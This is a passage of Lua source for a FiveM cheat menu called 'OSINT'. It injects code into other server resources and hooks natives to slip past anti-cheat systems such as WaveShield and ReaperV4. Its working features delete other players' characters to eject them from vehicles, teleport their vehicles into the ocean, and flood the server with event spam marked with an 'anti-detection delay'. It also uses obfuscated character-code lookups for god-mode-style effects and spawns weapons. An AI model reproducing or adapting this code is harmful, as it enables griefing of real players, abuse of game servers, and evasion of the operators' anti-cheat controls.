                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "button", label = "Teleport to Ocean",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        OSINT:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                        MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                    }
                },
                {
                    label = "Triggers",
                    tabs = {
                    { type = "checkbox", label = "Server Console Spam", checked = false,
                        onSelect = function(checked)
                            if checked then
                                print('Console Spam Started...')
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                    if not _G.OSINTServerConsoleSpamInitialized then
                                        _G.OSINTServerConsoleSpamEnabled = true
                                        _G.OSINTServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.OSINT then
                                            _G.OSINT = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.OSINTServerConsoleSpamInitialized do
                                                if not _G.OSINTServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.OSINT.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.OSINTServerConsoleSpamEnabled = true
                                    end
                                ]])
                            else
                                print('Console Spam Stopped...')
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                    _G.OSINTServerConsoleSpamEnabled = false
                                ]])
                            end
                        end
                    },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Weapon",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "button", label = "Give Weapon",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "WEAPON_", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedWeapon(val)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Give All Weapons",
                            onSelect = function()
                                self:GiveAllWeapons()
                            end
                        },
                        { type = "button", label = "Remove All Weapons",
                            onSelect = function()
                                self:RemoveAllWeapons()
                            end
                        },
                        { type = "divider", label = "All Weapons" },
                        { type = "scrollable", label = "Melee", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_unarmed", "weapon_knife", "weapon_dagger", "weapon_bat", "weapon_bottle", "weapon_crowbar", "weapon_golfclub", "weapon_hammer", "weapon_hatchet", "weapon_machete", "weapon_switchblade", "weapon_nightstick", "weapon_wrench" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Handguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pistol", "weapon_pistol_mk2", "weapon_combatpistol", "weapon_appistol", "weapon_stungun", "weapon_pistol50", "weapon_snspistol", "weapon_heavypistol", "weapon_vintagepistol", "weapon_flaregun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "SMGs", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_microsmg", "weapon_smg", "weapon_smg_mk2", "weapon_assaultsmg", "weapon_machinepistol", "weapon_minismg", "weapon_combatpdw" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Rifles", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_assaultrifle", "weapon_assaultrifle_mk2", "weapon_carbinerifle", "weapon_carbinerifle_mk2", "weapon_advancedrifle", "weapon_specialcarbine", "weapon_bullpuprifle", "weapon_gusenberg", "weapon_compactrifle", "weapon_bullpuprifle_mk2", "weapon_marksmanrifle" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Shotguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pumpshotgun", "weapon_pumpshotgun_mk2", "weapon_sawnoffshotgun", "weapon_assaultshotgun", "weapon_bullpupshotgun", "weapon_heavyshotgun", "weapon_autoshotgun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Snipers", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_sniperrifle", "weapon_heavysniper", "weapon_heavysniper_mk2", "weapon_marksmanrifle", "weapon_marksmanrifle_mk2" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Explosives", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_grenade", "weapon_stickybomb", "weapon_molotov", "weapon_pipebomb", "weapon_proxmine", "weapon_rpg", "weapon_grenadelauncher", "weapon_rpg", "weapon_minigun", "weapon_firework" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Heavy", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_mg", "weapon_combatmg", "weapon_gusenberg", "weapon_minigun", "weapon_grenadelauncher", "weapon_railgun", "weapon_hominglauncher", "weapon_compactlauncher" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Throwables", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_ball", "weapon_flare", "weapon_smokegrenade", "weapon_bzgas", "weapon_petrolcan" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        }
                    }
                },
                {
                    label = "Combat",
                    tabs = {
                        { type = "button", label = "Test Button",
                        onSelect = function()
                        print('hi')
                        end
                        },
                        { type = "checkbox", label = "Infinite Ammo ", desc = "Infinite Ammo, this might be detected on certain servers", checked = false,
                            onSelect = function(checked)
                                if checked then
                                self:Notify("success", "OSINT", "Enabled Infinite Ammo", 5000)
                                    self:EnableInfiniteAmmo()
                                else
                                self:Notify("error", "OSINT", "Disabled Infinite Ammo", 5000)                                    
                                    self:DisableInfiniteAmmo()
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Headshot",
                            checked = false,
                            desc = "This will prevent you from being headshot.",
                            onSelect = function(checked)
                                if checked then
                                    self:Notify("success", "OSINT", "Enabled Anti-Headshot", 5000)
                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                                or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) â€” copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]])
                                    end

                                else
                                    self:Notify("error", "OSINT", "Disabled Anti-Headshot", 5000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                                or "any",
                                        [[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]])
                                    else
                                        Injection("any", [[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]])
                                    end
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Vehicle",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "checkbox", label = "Teleport Into", desc = "If selected, this will teleport you into the selected vehicle.", checked = false,
                            onSelect = function(checked)
                                TeleportInto = checked or false
                            end
                        },
                        { type = "checkbox", label = "Delete Previous", desc = "If selected, this will delete your previous vehicle when spawning selected vehicle.", checked = false,
                            onSelect = function(checked)
                                DeletePrevious = checked or false
                            end
                        },
                        { type = "divider", label = "All Vehicles" },
                        { type = "button", label = "Addon",
                            onSelect = function()
                                KeyboardInput("Addon Vehicle", "", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedVehicle(val, TeleportInto, DeletePrevious)
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Compacts",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asbo", "blista", "brioso", "brioso2", "brioso3", "club", "dilettante", "dilettante2", "issi2", "issi3", "issi4", "issi5", "issi6", "kanjo", "panto", "prairie", "rhapsody", "weevil" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sedans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asea", "asea2", "asterope", "asterope2", "cinquemila", "driftchavosv6", "cog55", "cog552", "cognoscenti", "cognoscenti2", "deity", "hardy", "drifthardy", "emperor", "emperor2", "emperor3", "fugitive", "glendale", "glendale2", "impaler5", "ingot", "intruder", "minimus", "limo2", "premier", "primo", "primo2", "regina", "rhinehart", "romero", "schafter2", "schafter5", "schafter6", "stafford", "stanier", "stratum", "stretch", "superd", "surge", "tailgater", "tailgater2", "warrener", "warrener2", "washington" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "SUVs",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "aleutian", "astron", "baller", "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "bjxl", "cavalcade", "cavalcade2", "cavalcade3", "contender", "dorado", "dubsta", "dubsta2", "everon3", "fq2", "granger", "granger2", "gresley", "habanero", "huntley", "issi8", "iwagen", "jubilee", "landstalker", "landstalker2", "mesa", "mesa2", "novak", "patriot", "patriot2", "radi", "rebla", "rocoto", "seminole", "seminole2", "serrano", "squaddie", "toros", "vivanite", "woodlander", "xls", "xls2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Coupes",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "cogcabrio", "driftfr36", "exemplar", "f620", "felon", "felon2", "fr36", "jackal", "kanjosj", "oracle", "oracle2", "postlude", "previon", "sentinel", "sentinel2", "windsor", "windsor2", "zion", "zion2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Muscles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
